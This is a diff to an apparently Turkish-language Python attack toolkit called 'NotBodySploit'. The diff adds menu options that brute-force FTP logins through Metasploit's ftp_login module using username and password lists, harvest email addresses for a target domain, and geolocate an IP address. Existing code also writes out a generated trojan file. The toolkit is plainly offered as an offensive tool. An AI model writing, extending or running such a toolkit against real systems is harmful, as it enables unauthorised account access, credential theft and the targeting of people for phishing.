@@ -1,6 +1,8 @@
-#CODED BY NOTBODY
+#! /usr/bin/python3
+# CODED BY NOTBODY...
 import os
 import time
+import requests
 def clear():
     if os.name == 'nt':
         _ = os.system('cls')
@@ -10,6 +12,13 @@ def clear():
         _ = os.system('clear')
     else:
         _ = os.system('clear')
+def check(): 
+    r = requests.get("https://ipinfo.io/") 
+    if r.status_code == 200: 
+        print("\n[+] Sunucuya Bağlanıldı!\n") 
+    else:
+        print("\n[!] Sunucuya Bağlanılamadı!\n") 
+        exit() 
 os.system("xtitle NotBodySploit")
 clear()
 ressamnotbody = """\033[94m\033[1m
@@ -29,14 +38,17 @@ ressamnotbody = """\033[94m\033[1m
 ;   |.'                   ---`-'  |   | ,'              \   \  /     :  \  \ 
 '---'                             `----'                 `----'       \  ' ; 
                                                                        `--`  
-       \033[93m Instagram: https://www.instagram.com/notbodyofficial/\033[94m\033[1m
+       \033[93m Instagram: https://www.instagram.com/notbodyofficial/
 
-       \033[93m Git-Hub: https://github.com/not-body/  \033[94m\033[1m    V 1.1                                                                                                          
+       \033[93m Git-Hub: https://github.com/not-body/  \033[94m\033[1m    V 1.2                                                                                                          
                      
                                                   """
 anamenu = """\033[91m
 1 ) Şifrelemeler
 2 ) Trojan
+3 ) FTP Bruter (Metasploit)
+4 ) Domain Mail Scanner (Metasploit)
+5 ) IP Sorgu
 """
 neyapakaq = """\033[91m
 1 ) Şifrele 
@@ -177,6 +189,8 @@ if(body == "1"):
             print(n)
         else:
             print("\033[91mBir Şeyler Yanlış Gitti")
+            time.sleep(1)
+            exit()
     elif(sec == "2"):
         clear()
         print(ressamnotbody)
@@ -193,9 +207,11 @@ if(body == "1"):
             print(n)
         else:
             print("\033[91mBir Şeyler Yanlış Gitti")
+            time.sleep(1)
             exit()
     else:
         print("\033[91mBir Şeyler Yanlış Gitti")
+        time.sleep(1)
         exit()
 elif(body == "2"):
     clear()
@@ -223,16 +239,44 @@ elif(body == "2"):
         gfj = open(d, "w+")
         gfj.write(trojan.format(c, b))
         print("\033[95mDosya Oluşturuldu.")
-
-
-
-        
-    
-
-
-else:
-    print("\033[91mYanlış Giden Bir Şeyler Var")    
+elif(body == "3"):
+    clear()
+    print(ressamnotbody)
+    a = input("\033[92m İp Adresi: ")
+    b = input("\033[92m Username List: ")
+    c = input("\033[92m Passwoed List: ")
+    time.sleep(1)
+    os.system("""msfconsole -q -x "use auxiliary/scanner/ftp/ftp_login; set RHOSTS {} ; set USER_FILE {} ; set PASS_FILE {} ; exploit ; exit" """.format(a, b, c))
+elif(body == "4"):
+    clear()
+    print(ressamnotbody)
+    a = input("\033[92m Domain: ")
+    time.sleep(1)
+    os.system("""msfconsole -q -x "use auxiliary/gather/search_email_collector; set DOMAIN {}; exploit ; exit" """.format(a))
+elif(body == "5"):
+    clear()
+    print(ressamnotbody)
+    ip = input("\033[92m Hedef İp: ") 
+    check() 
+    country = requests.get("https://ipinfo.io/{}/country/".format(ip)).text 
+    city = requests.get("https://ipinfo.io/{}/city/".format(ip)).text
+    region = requests.get("https://ipinfo.io/{}/region/".format(ip)).text
+    postal = requests.get("https://ipinfo.io/{}/postal/".format(ip)).text
+    timezone = requests.get("https://ipinfo.io/{}/timezone/".format(ip)).text
+    orgination = requests.get("https://ipinfo.io/{}/org/".format(ip)).text
+    location =  requests.get("https://ipinfo.io/{}/loc/".format(ip)).text
+    print("\033[95mİp: "+ip)
+    print("\033[95mÜlke: "+country)
+    print("\033[95mŞehir: "+city)
+    print("\033[95mBölge: "+region)
+    print("\033[95mPosta Kodu: "+postal)
+    print("\033[95mZaman Dilimi: "+timezone)
+    print("\033[95mOrganizasyon: "+orgination)
+    print("\033[95mLokasyon: "+location)
     exit()
+else:
+    print("\033[91mYanlış Giden Bir Şeyler Var")
+    exit()   
         
     
     
